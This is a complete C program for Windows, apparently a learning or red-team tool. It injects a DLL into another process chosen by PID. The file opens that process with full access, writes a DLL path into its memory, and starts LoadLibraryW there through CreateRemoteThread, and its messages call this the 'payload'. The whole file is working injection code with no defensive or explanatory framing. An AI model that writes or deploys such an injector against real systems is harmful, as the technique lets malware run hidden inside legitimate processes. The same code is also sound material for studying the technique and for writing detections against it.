#include <windows.h>
#include <stdio.h>

HANDLE hProcess, hThread = NULL;
DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;

// DLL path and size to inject
wchar_t dllPath[MAX_PATH] = L"C:\\Path\\to\\my_dll.dll";
SIZE_T size_of_dllPath = sizeof(dllPath);

int main(int argc, char *argv[])
{

	// checking for arguments given
	if (argc < 2)
	{
		printf("Usage: program.exe <PID>\n");
		return EXIT_FAILURE;
	}

	// taking the first argument and converting it to an INT
	// because when it comes in it is a char[]
	PID = atoi(argv[1]);
	printf("\nTrying to open a handle to process with PID: %ld\n", PID);

	// Opening a process and checking to ensure it is valid
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL)
	{
		printf("\nFailed to get a handle to process with PID %ld error %ld\n", PID, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("\nGot a handle to the process!\n\\---0x%p\n", hProcess);

	// allocate memory needed to prepare the space before writing the data in
	rBuffer = VirtualAllocEx(hProcess, NULL, size_of_dllPath, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (rBuffer == NULL)
	{
		printf("\nFailed to create rBuffer memory space, error %ld\n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("\nAllocated rBuffer with PAGE_READWRITE permissions!\n");

	// write allocated memory to the process memory
	WriteProcessMemory(hProcess, rBuffer, dllPath, size_of_dllPath, NULL);
	printf("\nWrote [%S] to process memory\n", &dllPath);

	// Getting a handle to the needed module and checking to make sure its valid
	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL)
	{
		printf("\nFailed to get a handle to Kernel32.dll, error %ld\n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("\nGot a handle to Kernel32.dll successfully handle: \\---0x%p\n", hKernel32);

	// Specify function where thread should begin execution
	LPTHREAD_START_ROUTINE startHere = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("LoadLibraryW() function has been found and stored\n\\---0x%p", startHere);

	// Create thread to run allocated payload and check to make sure everything worked
	hThread = CreateRemoteThread(hProcess, NULL, 0, startHere, rBuffer, 0, &TID);
	if (hThread == NULL)
	{
		printf("\nFailed to get a handle to the thread, error %ld\n", GetLastError());
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("\nGot a handle to the Thread!\n\\---0x%p\n", hThread);

	printf("\nPayload Executing...\n");
	WaitForSingleObject(hThread, INFINITE);
	printf("Payload Finished executing\n");
	printf("Cleaning Up :)\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("\nAll Done.\n");
	return EXIT_SUCCESS;
}